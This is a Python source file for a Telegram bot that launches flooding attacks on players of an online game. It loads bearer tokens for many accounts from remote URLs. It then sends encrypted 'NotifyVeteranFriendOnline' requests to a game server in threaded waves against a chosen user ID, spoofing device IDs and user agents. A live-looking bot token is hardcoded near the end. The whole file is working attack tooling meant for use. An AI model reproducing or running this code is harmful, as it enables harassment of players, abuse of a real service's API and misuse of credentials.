import requests
import threading
import time
import random
import hashlib
import json

import requests
import threading
import time
import random
import hashlib
import json
import os
import asyncio
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import pad
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes


class AdvancedAttackSystem:
    def __init__(self):
        self.tokens = []
  
        
        
        
        
        self.api_urls = [
            "https://r1-acc-jwt.vercel.app/2a97793c9079a6d0d2c59c0f7a2aff3ec5618fca6edb870dc839c37ab35039d4",
            "https://r1-acc-jwt.vercel.app/47b43ac93afd549620ced3136eded96c13d6a7946ec2b8c497fa794d4c6f73dc",
            "https://r1-acc-jwt.vercel.app/53c37ceb3540643f541a72e1e653a08b2f65dfc0a67fa209bc2860d9807ff6d6",
            "https://r1-acc-jwt.vercel.app/0b04971d49f24acb738078827db1d03a3c6cbd198c40f468ee6f8cd382447e9f",
            "https://r1-acc-jwt.vercel.app/96f854d09d10a96f0f6a8ca5e1d248edc5b2cb936583b4777a14543f0de134ac",
            "https://r1-acc-jwt.vercel.app/9ca9c7dd7861767478c42dbaa574f4f1bf4867333721f859571f4f62d233df68",
            "https://r1-acc-jwt.vercel.app/4ce92b73d053a79ed8d6a7efe1e22f1e814e340bcbf9c032615582189db711c9",
            "https://r1-acc-jwt.vercel.app/d65b5ee57af4c87b26987cd1960557411c04e19998f2c1b687de3b006bc7fea7",
            "https://r1-acc-jwt.vercel.app/c59e77ecb83d5ce74a549d3488eaec48fc0682be3fadf35c571d8b54f1f36ddd",
            "https://r1-acc-jwt.vercel.app/7210839056dd0e7b2013d978d6679d3ec8206a62b83f5fbb198265d2b1e57c50",
            "https://r1-acc-jwt.vercel.app/20b117de0b2d84670c05f2bd6b8072c6d4c32035e858053882073dfad367b76c",
            "https://r1-acc-jwt.vercel.app/af3b7df50de5486d8ceded09b57421e9569f37b18a9144fd2a9335bf922cff27",
            "https://r1-acc-jwt.vercel.app/7a27d15d7caaaa2082f88dac135d88cd8487ffc9a0372888cb12c80b6da23947",
            "https://r1-acc-jwt.vercel.app/3ec377148c4b1edd0d920ef9add50f6722c0e61ed31c1eb0e237d788affcd494",
            "https://r1-acc-jwt.vercel.app/9c4cd4c91803fc9ba3f37350bb1e197ddfe8f4d788ee8ec9b453380cf7e75f7f",
            "https://r1-acc-jwt.vercel.app/cb6f2c51347139fea72cc4e02a34388e2bed6d2290f81d8b01ef1a8ce3a94968",
            "https://r1-acc-jwt.vercel.app/593a6adc78a90ded008a0c9f8a59cfd425fb0a250ee7494d6112f87535a3f046",
            "https://r1-acc-jwt.vercel.app/534b55b28fc3e644b40cebc0387c05decf93158f3a4a39aae9613bbec55cb9da",
            "https://r1-acc-jwt.vercel.app/957e6ebd7785fad4cf9ca245f976c39dad8816194d3ce3c173bf48f47868f1a6",
            "https://r1-acc-jwt.vercel.app/e3fe12f02288566d3337fc908c2aafd10cc603dfb89e42254f689b3cecf34d12",
            "https://r1-acc-jwt.vercel.app/71ff15e475882afe531ef43fb6aea25606bd34a5bd4ed0006131b3f16c13b862",
            "https://r1-acc-jwt.vercel.app/bc8018e81948a2356679ee626682256017653b7165da85bb78467ea586de5dad",
            "https://r1-acc-jwt.vercel.app/7d514086188c2e1c267f17dcfdfda5095e77f6ca5399ecbf9c5fc049f569ee73",
            "https://r1-acc-jwt.vercel.app/a9dd7698202cae26481661b8490bcc50ce74f9a8edb7ad1c26bc39435ebe6cf1",
            "https://r1-acc-jwt.vercel.app/bc1224698a477cffb464493e7d3cbb597009c1f5b541f17501ff04cc4696a378",
            "https://r1-acc-jwt.vercel.app/f81013d72c6f03801d16174175f0a2cd3d5a6dbc3a59a8396233d5cd294a5425",
            "https://r1-acc-jwt.vercel.app/2ae8d579b87c44f07f77f6cc764b00bf159e01e43c02b859f035c916fb49f332",
            "https://r1-acc-jwt.vercel.app/58c7015bbac5cb11d2d575178138ef41a9707681ba7e8aa6f285f1727518a8b1",
            "https://r1-acc-jwt.vercel.app/382f33cedfe4212f284730416ad1c944aaf135cc658a1580299558a3240bde46",
            "https://r1-acc-jwt.vercel.app/e47c95d4ba8c9e587600934c33944493636c6d2df7582460e41f9762b8388ca3",
            "https://r1-acc-jwt.vercel.app/93b5c321d7ad25ba5f860a7ad8b8f379098df1ac9ba1651344681fe449ce5c18",
            "https://r1-acc-jwt.vercel.app/07e194fcc67545f4d9629400837c5163bf30ecbcf1e79d41a2fe74f85ee3632f",
            "https://r1-acc-jwt.vercel.app/d57b77cf9c98a1b39fbd354639bbe535d7574a7b4bc9f646ef7ea87f37f6e960",
            "https://r1-acc-jwt.vercel.app/9c1b4437f139dd5cf953121415cbea6e788c8ec32945839ac703807c09054319",
            "https://r1-acc-jwt.vercel.app/daf716c379bdfb18676fd9e0bcba9588b208c1937c4ed7639b8d90d27fa070da",
            "https://r1-acc-jwt.vercel.app/bb3c63ec84552b91ead16391d26f190fc69745c9db1bbd2221211a59f6d61baa",
            "https://r1-acc-jwt.vercel.app/d612dbf8fa72b6f4ead40a86b99dadd1f8cc9d8de9383a72fc8885bf2bbdf0af",
            "https://r1-acc-jwt.vercel.app/05d748371dde56d52c3cc13e0e8cdc667d4200731c0e7043264863b873b79cbc",
            "https://r1-acc-jwt.vercel.app/db451ccb5d3f905cd623830a25bc869293016bd10c8733241450a6b0cae7c9af",
            "https://r1-acc-jwt.vercel.app/0c8bcba0260a6e1012e646f60337531985716dde0f584f778514e5ac766506ff",
            "https://r1-acc-jwt.vercel.app/94edb438ad144307e15b9be642d8b63e1e571da2e6e7f267fc04581856e09c9c",
            "https://r1-acc-jwt.vercel.app/b2b6a02c71e31605c5f44397a40cc27daddcf578835b129956b55c6860066b73",
            "https://r1-acc-jwt.vercel.app/282136c8f0540658261163657b9b37e16ffe75de319196e173fd8da694bd4db5",
            "https://r1-acc-jwt.vercel.app/0cad102393d6b8f9979d7cf2e6f1bde0ca76d66331f803a76cc9e379275b9f05",
            
            "https://r1-acc-jwt.vercel.app/b19ee0beb6548c369e0c30f7e51216efb8bbb8d813d35bc6232dda2074d31eb0",
            "https://r1-acc-jwt.vercel.app/c8b23f36bbeb2e0719f15feb8f059f05875d994f863c824f0bc42aac1a90b715"
        
        
        ]
        self.load_tokens_auto( )

    def load_tokens_auto(self):
        print("--- Loading Tokens ---")
        for url in self.api_urls:
            try:
                response = requests.get(url, timeout=10)
                if response.status_code == 200:
                    token_data = response.json()
                    if token_data.get("success") is True and "BearerAuth" in token_data:
                        self.tokens.append(token_data["BearerAuth"])
                        print(f"  [SUCCESS] Loaded token!")
                else:
                    print(f"  [FAIL] Status {response.status_code} for {url}")
            except Exception as e:
                print(f"  [ERROR] Exception for {url}: {e}")
        print(f"--- Total Tokens Loaded: {len(self.tokens)} ---\n")


    def get_random_token(self):
        return random.choice(self.tokens) if self.tokens else None

    def encrypt_id(self, number):
        number = int(number)
        encoded_bytes = []
        while True:
            byte = number & 0x7F
            number >>= 7
            if number: byte |= 0x80
            encoded_bytes.append(byte)
            if not number: break
        return bytes(encoded_bytes).hex()

    def encrypt_api(self, plain_text):
        plain_text = bytes.fromhex(plain_text)
        key = bytes([89, 103, 38, 116, 99, 37, 68, 69, 117, 104, 54, 37, 90, 99, 94, 56])
        iv = bytes([54, 111, 121, 90, 68, 114, 50, 50, 69, 51, 121, 99, 104, 106, 77, 37])
        cipher = AES.new(key, AES.MODE_CBC, iv)
        return cipher.encrypt(pad(plain_text, AES.block_size)).hex()

    def send_request(self, session, target_id, token):
        try:
            iddd = "0a" + self.encrypt_id(len(target_id) // 2) + self.encrypt_id(target_id)
            encrypted_data = self.encrypt_api(iddd)
            headers = {
                "Content-Type": "application/x-www-form-urlencoded", "X-GA": "v1 1", "ReleaseVersion": "OB51",
                "Host": "clientbp.ggwhitehawk.com", "Accept-Encoding": "gzip",
                "User-Agent": f"Dalvik/2.1.0 (Linux; U; Android {random.randint(9, 13)}; SM-G9{random.randint(8,9)}N Build/TP1A.220624.014)",
                "Connection": "keep-alive", "Authorization": f"Bearer {token}", "X-Unity-Version": "2018.4.11f1",
                "X-Device-ID": hashlib.md5(str(random.random()).encode()).hexdigest()[:16],
                "X-Platform": "android", "X-App-Version": str(random.randint(100000, 999999))
            }
            session.post("https://clientbp.ggwhitehawk.com/NotifyVeteranFriendOnline", headers=headers, data=bytes.fromhex(encrypted_data ), timeout=2)
        except Exception:
            pass

    def wave_worker(self, target_id, stop_event, tokens_for_wave):
        session = requests.Session()
        adapter = requests.adapters.HTTPAdapter(pool_connections=50, pool_maxsize=50)
        session.mount('https://', adapter )
        
        while not stop_event.is_set():
            
            pulse_end_time = time.time() + 3 
            while time.time() < pulse_end_time and not stop_event.is_set():
                token = random.choice(tokens_for_wave)
                self.send_request(session, target_id, token)
                time.sleep(0.01) 
            
            
            if not stop_event.is_set():
                time.sleep(0.1) 

    def start_storm_attack(self, target_id, num_waves=5):
        if not self.tokens:
            return None, None

        stop_event = threading.Event()
        all_threads = []
        
        
        tokens_per_wave = max(1, len(self.tokens) // num_waves)
        wave_token_sets = [self.tokens[i:i + tokens_per_wave] for i in range(0, len(self.tokens), tokens_per_wave)]

        print(f"Unleashing the storm: {num_waves} waves, {len(self.tokens)} total accounts.")

        for i, token_set in enumerate(wave_token_sets):
            if not token_set: continue
            
            
            wave_thread = threading.Thread(target=self.wave_worker, args=(target_id, stop_event, token_set), daemon=True)
            all_threads.append(wave_thread)
            wave_thread.start()
            print(f"  -> Wave {i+1} launched...")
            time.sleep(0.1) 

        return stop_event, all_threads

class TelegramAttackBot:
    def __init__(self, token):
        self.attack_system = AdvancedAttackSystem()
        self.active_attacks = {}
        self.app = Application.builder().token(token).build()
        self.setup_handlers()

    def setup_handlers(self):
        self.app.add_handler(CommandHandler("dm", self.dm))
        self.app.add_handler(CommandHandler("remove", self.remove_attack))

    async def dm(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not context.args:
            await update.message.reply_text("Usage: /dm UID")
            return
        
        target_id = context.args[0]
        if not self.attack_system.tokens:
            await update.message.reply_text("خطأ: لم يتم تحميل أي حسابات. لا يمكن بدء الهجوم.")
            return
        
        if target_id in self.active_attacks:
            await update.message.reply_text(f"المقبرة مستمرة بالفعل على: {target_id}")
            return
        
        
        
        num_waves = min(len(self.attack_system.tokens), 200) 
        stop_event, threads = self.attack_system.start_storm_attack(target_id, num_waves=num_waves)
        
        if not threads:
            await update.message.reply_text("فشل في بدء الهجوم.")
            return

        self.active_attacks[target_id] = {"stop_event": stop_event, "threads": threads}
        await update.message.reply_text(f"done {len(threads)} {target_id}")

    async def remove_attack(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not context.args:
            await update.message.reply_text("Usage: /remove UID")
            return
        
        target_id = context.args[0]
        if target_id in self.active_attacks:
            print(f"Stopping attack on {target_id}...")
            self.active_attacks[target_id]["stop_event"].set()
            for thread in self.active_attacks[target_id]["threads"]:
                thread.join(timeout=2)
            
            del self.active_attacks[target_id]
            await update.message.reply_text(f"stop for {target_id}")
            print("Attack stopped.")
        else:
            await update.message.reply_text(f"لا يوجد هجوم فعال على {target_id}")

    def run(self):
        if not self.attack_system.tokens:
            print("CRITICAL: No tokens loaded. Bot will start but cannot attack.")
        print("Bot is running...")
        self.app.run_polling()

if __name__ == "__main__":
    BOT_TOKEN = "8472861370:AAF6QJZV8_R6GRpBq5ziQzvxYqX4WWDPC-E"
    
    if not BOT_TOKEN or "YOUR_TOKEN" in BOT_TOKEN:
        print("Error: Please set your Telegram bot token in the script.")
    else:
        try:
            
            bot = TelegramAttackBot(BOT_TOKEN)
            bot.run()
        except Exception as e:
            print(f"An error occurred during startup: {e}")
